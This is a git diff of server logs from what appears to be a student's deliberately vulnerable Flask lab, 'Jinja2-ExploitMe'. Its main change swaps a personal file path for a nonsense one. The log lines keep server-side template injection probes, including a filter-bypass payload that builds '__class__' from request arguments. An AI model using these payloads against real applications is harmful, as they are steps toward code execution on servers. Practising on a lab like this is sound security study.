@@ -1,3 +1,5 @@
+## paths may not be accurate
+
 ➜  Jinja2-ExploitMe git:(master) export FLASK_ENV=development; flask run
  * Environment: development
  * Debug mode: on
@@ -57,7 +59,7 @@
 127.0.0.1 - - [07/Apr/2020 18:46:14] "GET /?exploit={{(7*%277%27)}} HTTP/1.1" 200 -
 127.0.0.1 - - [07/Apr/2020 18:48:50] "GET /?exploit={{%20[].class.base.subclasses()%20}} HTTP/1.1" 500 -
 Traceback (most recent call last):
-  File "/Users/elaine/school-projects/Spring2020/BEW-2-3/Jinja2-ExploitMe/app.py", line 29, in index
+  File "/daDdy/^/oomph/Spring2020/BEW-2-3/Jinja2-ExploitMe/app.py", line 29, in index
     render_template_string(rendered_template)
   File "/usr/local/lib/python3.7/site-packages/flask/templating.py", line 155, in render_template_string
     return _render(ctx.app.jinja_env.from_string(source), context, ctx.app)
@@ -100,7 +102,7 @@ Traceback (most recent call last):
     rv = self.dispatch_request()
   File "/usr/local/lib/python3.7/site-packages/flask/app.py", line 1935, in dispatch_request
     return self.view_functions[rule.endpoint](**req.view_args)
-  File "/Users/elaine/school-projects/Spring2020/BEW-2-3/Jinja2-ExploitMe/app.py", line 33, in index
+  File "/daDdy/^/oomph/Spring2020/BEW-2-3/Jinja2-ExploitMe/app.py", line 33, in index
     return render_template_string(rendered_template)
   File "/usr/local/lib/python3.7/site-packages/flask/templating.py", line 155, in render_template_string
     return _render(ctx.app.jinja_env.from_string(source), context, ctx.app)
@@ -149,7 +151,7 @@ jinja2.exceptions.UndefinedError: 'list object' has no attribute 'class'
 127.0.0.1 - - [09/Apr/2020 17:27:47] "GET /?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_ HTTP/1.1" 200 -
 [2020-04-09 17:28:21,611] ERROR in app: Exception on / [GET]
 Traceback (most recent call last):
-  File "/Users/elaine/school-projects/Spring2020/BEW-2-3/Jinja2-ExploitMe/app.py", line 29, in index
+  File "/daDdy/^/oomph/Spring2020/BEW-2-3/Jinja2-ExploitMe/app.py", line 29, in index
     render_template_string(rendered_template)
   File "/usr/local/lib/python3.7/site-packages/flask/templating.py", line 155, in render_template_string
     return _render(ctx.app.jinja_env.from_string(source), context, ctx.app)
@@ -181,7 +183,7 @@ Traceback (most recent call last):
     rv = self.dispatch_request()
   File "/usr/local/lib/python3.7/site-packages/flask/app.py", line 1935, in dispatch_request
     return self.view_functions[rule.endpoint](**req.view_args)
-  File "/Users/elaine/school-projects/Spring2020/BEW-2-3/Jinja2-ExploitMe/app.py", line 33, in index
+  File "/daDdy/^/oomph/Spring2020/BEW-2-3/Jinja2-ExploitMe/app.py", line 33, in index
     return render_template_string(rendered_template)
   File "/usr/local/lib/python3.7/site-packages/flask/templating.py", line 155, in render_template_string
     return _render(ctx.app.jinja_env.from_string(source), context, ctx.app)
